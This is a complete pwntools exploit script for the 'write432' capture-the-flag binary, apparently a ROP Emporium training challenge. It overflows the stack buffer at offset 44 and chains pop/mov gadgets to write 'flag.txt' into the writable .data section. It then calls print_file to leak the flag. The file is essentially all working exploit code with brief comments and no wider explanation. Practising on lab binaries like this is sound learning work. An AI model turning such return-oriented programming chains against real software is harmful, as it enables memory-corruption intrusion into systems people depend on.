from pwn import *

bin = './write432'
elf = ELF(bin)
p = process(bin)

offset = 44

pop_edi_ebp = 0x080485aa #pop edi; pop ebp; ret;
mov_edi_ebp = 0x08048543 #mov dword ptr [edi], ebp; ret;


data = 0x804a018  # writable section extracted from vmmap

payload  = b"A"*offset

# write "flag"
payload += p32(pop_edi_ebp)
payload += p32(data)          # edi -> .data
payload += b"flag"            # ebp
payload += p32(mov_edi_ebp)

# write ".txt"
payload += p32(pop_edi_ebp)
payload += p32(data+4)        # edi -> .data+4
payload += b".txt"            # ebp
payload += p32(mov_edi_ebp)

# call print_file("flag.txt")
payload += p32(elf.plt['print_file'])
payload += p32(elf.symbols['main'])   # safe “after” address
payload += p32(data)                   # arg: "flag.txt"

#gdb.attach(p) ---  doesn't work

p.sendafter(b'> ',payload)

output = p.recvall(timeout=1).decode()
print(output)

